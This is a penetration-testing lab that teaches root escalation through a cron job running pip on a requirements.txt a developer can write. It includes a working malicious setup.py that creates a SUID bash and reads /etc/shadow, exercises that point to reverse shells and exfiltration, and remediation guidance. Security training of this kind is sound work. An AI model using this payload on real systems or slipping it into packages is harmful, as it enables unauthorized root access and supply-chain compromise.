# LAB: Pip Requirements Injection → Root

**Real-World Privilege Escalation**

---

## Scenario: Automated Dependency Management

You are a penetration tester who has gained initial access to a Linux server as a low-privilege user (`developer`). Your goal is to escalate to root.

**Background:**
The DevOps team has set up automated dependency updates for a Python application. A scheduled job runs `pip install` as root to ensure system-wide packages are installed and updated.

**Your access:**
- SSH access as `developer`
- Write access to the application's requirements.txt
- No sudo privileges

**Your mission:**
Escalate from `developer` to `root` using only the access you have.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Understand how pip processes requirements.txt
2. Identify dangerous pip configurations (running as root)
3. Exploit pip via malicious local packages
4. Achieve root access through package installation
5. Recognize supply chain attack vectors

---

## PHASE 0 — Environment Setup (Instructor Only)

### Create the developer user

```bash
useradd -m -s /bin/bash developer
echo "developer:developer123" | chpasswd
```

### Create the application directory

```bash
mkdir -p /srv/webapp
chown -R developer:developer /srv/webapp
chmod 755 /srv/webapp
```

### Create a basic Python application

```bash
cat > /srv/webapp/app.py << 'EOF'
#!/usr/bin/env python3
# Simple Web Application
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
    return 'Hello, World!'

if __name__ == '__main__':
    app.run()
EOF

cat > /srv/webapp/requirements.txt << 'EOF'
flask>=2.0.0
requests>=2.25.0
EOF

chown developer:developer /srv/webapp/app.py /srv/webapp/requirements.txt
```

### Create the dependency update script (runs as root)

```bash
cat > /usr/local/bin/update-deps.sh << 'EOF'
#!/bin/bash
# Automated Dependency Update Script
# Deployed by DevOps - Do not modify
# Ticket: DEVOPS-2891
#
# Ensures all application dependencies are installed and up-to-date

APP_DIR="/srv/webapp"
LOG="/var/log/update-deps.log"

echo "[$(date)] Starting dependency update" >> "$LOG"

cd "$APP_DIR"

# Install/update dependencies from requirements.txt
pip3 install -r requirements.txt --upgrade 2>> "$LOG"

echo "[$(date)] Dependency update complete" >> "$LOG"
EOF

chmod 755 /usr/local/bin/update-deps.sh
chown root:root /usr/local/bin/update-deps.sh
```

### Schedule the cron job

```bash
echo "*/5 * * * * root /usr/local/bin/update-deps.sh" > /etc/cron.d/update-deps
chmod 644 /etc/cron.d/update-deps
```

### Create log file

```bash
touch /var/log/update-deps.log
chmod 644 /var/log/update-deps.log
```

**Setup complete.** The environment mimics a real application server.

---

## PHASE 1 — Initial Access & Reconnaissance

### Log in as the attacker

```bash
su - developer
```

### Verify your privileges

```bash
id
sudo -l
```

**Expected:** No sudo access.

---

## PHASE 2 — Enumeration

### Examine the application directory

```bash
ls -la /srv/webapp/
```

**Observations:**
- Developer owns the files
- Can modify requirements.txt

### Check for scheduled tasks

```bash
cat /etc/cron.d/*
```

**Found:**
```
*/5 * * * * root /usr/local/bin/update-deps.sh
```

### Examine the update script

```bash
cat /usr/local/bin/update-deps.sh
```

**Critical finding:**
```bash
cd "$APP_DIR"
pip3 install -r requirements.txt --upgrade
```

Root runs `pip install` from a requirements.txt we control!

---

## 🔴 STOP AND THINK

**Ask yourself:**

1. Can I modify the update script? → No
2. Can I modify requirements.txt? → **Yes**
3. Does pip execute code during installation? → **Yes** (setup.py)
4. Can I create a malicious local package? → **Yes**

**This is a pip requirements injection vulnerability.**

---

## PHASE 3 — Understanding the Attack

### How pip executes code

When pip installs a package, it runs the package's `setup.py` script. This script can contain arbitrary Python code that executes during installation.

### Attack vectors

1. **Local package path:** `requirements.txt` can reference local directories
2. **Malicious setup.py:** Code in setup.py runs as the pip user (root)
3. **Custom index:** Point to attacker-controlled PyPI server

### The attack chain

```
developer modifies requirements.txt
    → Adds reference to local malicious package
    → Root runs pip install -r requirements.txt
    → pip processes the local package
    → setup.py executes as root
    → Attacker code runs with root privileges
```

---

## PHASE 4 — Exploitation

### Create a malicious local package

```bash
# Create package directory
mkdir -p /srv/webapp/evil_package

# Create malicious setup.py
cat > /srv/webapp/evil_package/setup.py << 'EOF'
from setuptools import setup
import os

# Malicious code executed during pip install
os.system('cp /bin/bash /tmp/rootbash')
os.system('chmod 4755 /tmp/rootbash')
os.system('echo "Pwned at $(date)" > /tmp/pwned.txt')
os.system('chmod 644 /tmp/pwned.txt')

setup(
    name='evil-package',
    version='1.0.0',
    description='Totally legitimate package',
    py_modules=['evil'],
)
EOF

# Create a dummy module (required for valid package)
echo "# Evil module" > /srv/webapp/evil_package/evil.py
```

### Modify requirements.txt to include the malicious package

```bash
# Add the local package to requirements.txt
echo "./evil_package" >> /srv/webapp/requirements.txt
```

### Verify the modification

```bash
cat /srv/webapp/requirements.txt
```

**Expected:**
```
flask>=2.0.0
requests>=2.25.0
./evil_package
```

---

## PHASE 5 — Wait for Execution

### Option A: Wait for cron

```bash
watch -n 10 'ls -la /tmp/rootbash /tmp/pwned.txt 2>/dev/null'
```

### Option B: Instructor triggers manually

```bash
sudo /usr/local/bin/update-deps.sh
```

### Verify execution

```bash
ls -la /tmp/rootbash
cat /tmp/pwned.txt
```

**Expected:**
```
-rwsr-xr-x 1 root root ... /tmp/rootbash
Pwned at [timestamp]
```

---

## PHASE 6 — Privilege Escalation Complete

### Execute the SUID shell

```bash
/tmp/rootbash -p
```

### Verify root access

```bash
id
whoami
cat /etc/shadow | head -3
```

---

## PHASE 7 — Post-Exploitation Analysis

### The attack chain

```
developer (uid=1001)
    │
    ├── Found writable requirements.txt
    ├── Discovered root pip cron job
    │
    ▼
Created malicious local package
    │
    ├── evil_package/setup.py with payload
    ├── Modified requirements.txt
    │
    ▼
Root cron executed pip install
    │
    ├── pip processed requirements.txt
    ├── pip installed ./evil_package
    ├── setup.py executed as root
    ├── SUID bash created
    │
    ▼
root (euid=0)
```

### What failed

| Layer | Failure |
|-------|---------|
| **Design** | Root runs pip on user-controlled requirements |
| **Permissions** | Developer can modify requirements.txt |
| **Least Privilege** | Package installation runs as root |

### The one-sentence summary

> **Root executed pip install on a requirements file controlled by an unprivileged user.**

---

## REMEDIATION

### Fix 1: Run pip as non-root user

```bash
# Create dedicated user
useradd -r -s /usr/sbin/nologin appuser

# Change cron to run as appuser
*/5 * * * * appuser /usr/local/bin/update-deps.sh

# Use virtual environment
python3 -m venv /srv/webapp/venv
chown -R appuser:appuser /srv/webapp/venv
```

### Fix 2: Use --no-deps and pinned versions

```bash
# Prevent transitive dependency attacks
pip3 install --no-deps -r requirements.txt
```

### Fix 3: Disallow local packages

```bash
# Only allow packages from PyPI
pip3 install --only-binary :all: -r requirements.txt
```

### Fix 4: Protect requirements.txt

```bash
# Make requirements.txt read-only for developer
chown root:developer /srv/webapp/requirements.txt
chmod 644 /srv/webapp/requirements.txt
```

### Fix 5: Use pip-audit and verify hashes

```bash
# Pin exact versions with hashes in requirements.txt
flask==2.0.1 --hash=sha256:abc123...

# Verify before installing
pip-audit -r requirements.txt
pip3 install --require-hashes -r requirements.txt
```

### Fix 6: Use containers

```bash
# Run the application in a container
# Build image with dependencies locked at build time
# Never run pip as root in production
```

---

## VULNERABILITY CLASSIFICATION

| Framework | Classification |
|-----------|----------------|
| **CWE** | CWE-94: Improper Control of Generation of Code |
| **CWE** | CWE-426: Untrusted Search Path |
| **MITRE ATT&CK** | T1195.002: Supply Chain Compromise: Software Supply Chain |
| **OWASP** | A08:2021 Software and Data Integrity Failures |

---

## REAL-WORLD EXAMPLES

This vulnerability pattern appears in:

1. **CI/CD pipelines** — Build systems running pip as root
2. **Deployment scripts** — Automated package installation
3. **Dependency confusion attacks** — Malicious packages with internal names
4. **Typosquatting** — Packages with names similar to popular ones

### Notable incidents:
- **ua-parser-js (2021)** — NPM package hijacked
- **event-stream (2018)** — Malicious code in dependency
- **codecov (2021)** — Bash uploader compromise

---

## CLEANUP (Instructor)

```bash
pkill -u developer 2>/dev/null || true
userdel -r developer 2>/dev/null || true
rm -f /etc/cron.d/update-deps
rm -f /usr/local/bin/update-deps.sh
rm -rf /srv/webapp
rm -f /var/log/update-deps.log
rm -f /tmp/rootbash /tmp/pwned.txt
```

---

## STUDENT EXERCISES

### Exercise 1: Alternative Payloads

Create a setup.py that:
- Adds an SSH key to /root/.ssh/authorized_keys
- Creates a reverse shell
- Exfiltrates environment variables

### Exercise 2: Dependency Confusion

Research "dependency confusion" attacks. How does this lab relate?

### Exercise 3: Detection

How would you detect malicious setup.py execution?
- Process monitoring
- File integrity
- Network connections during pip install

### Exercise 4: npm/yarn Equivalent

How would this attack work with npm or yarn in the Node.js ecosystem?
